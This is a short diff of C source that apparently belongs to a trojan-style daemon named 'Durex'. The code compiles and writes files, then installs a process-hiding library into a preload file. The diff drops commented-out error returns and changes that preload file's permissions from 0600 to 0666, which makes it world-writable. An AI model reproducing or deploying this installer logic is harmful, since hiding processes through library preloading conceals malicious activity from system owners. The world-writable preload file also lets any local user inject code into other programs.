@@ -50,7 +50,6 @@ static int		compile_files(t_lib *lib, size_t size)
 			lib[i].status = -1;
 			serverLog(1, "[INFO] - %s\t: %s\n", lib[i].files, strerror(errno));
 			continue ;
-			// return install_failed("Failed to fork.\n", lib, size);
 		}
 		if (pid == 0)
 		{
@@ -80,7 +79,6 @@ static int		create_files(t_lib *lib, size_t size)
 		if (lib[i].status < 0) {
 			serverLog(0, "%s\n", strerror(errno));
 			continue ;
-			// return install_failed("%s \n", lib, i);
 		}
 		ret = write(lib[i].status, lib[i].src, mystrlen(lib[i].src));
 		close(lib[i].status);
@@ -88,7 +86,6 @@ static int		create_files(t_lib *lib, size_t size)
 			serverLog(0, "wrote %d/%d\n", ret, mystrlen(lib[i].src));
 			lib[i].status = -1;
 			continue ;
-			// return install_failed("Failed to write %s.\n", lib, i);
 		}
 		serverLog(0, "Ok\n");
 	}
@@ -133,7 +130,7 @@ static int		install_library(t_lib *lib, size_t size)
 	size_t		ret;
 
 	serverLog(1, "[INFO] - Installing library ... ");
-	fd = open(DUREX_PRELOAD, O_CREAT | O_TRUNC | O_WRONLY, 0600);
+	fd = open(DUREX_PRELOAD, O_CREAT | O_TRUNC | O_WRONLY, 0666);
 	if (fd >= 0) {
 		ret = write(fd, DUREX_PROCESSHIDER_LIB, sizeof(DUREX_PROCESSHIDER_LIB));
 		close(fd);
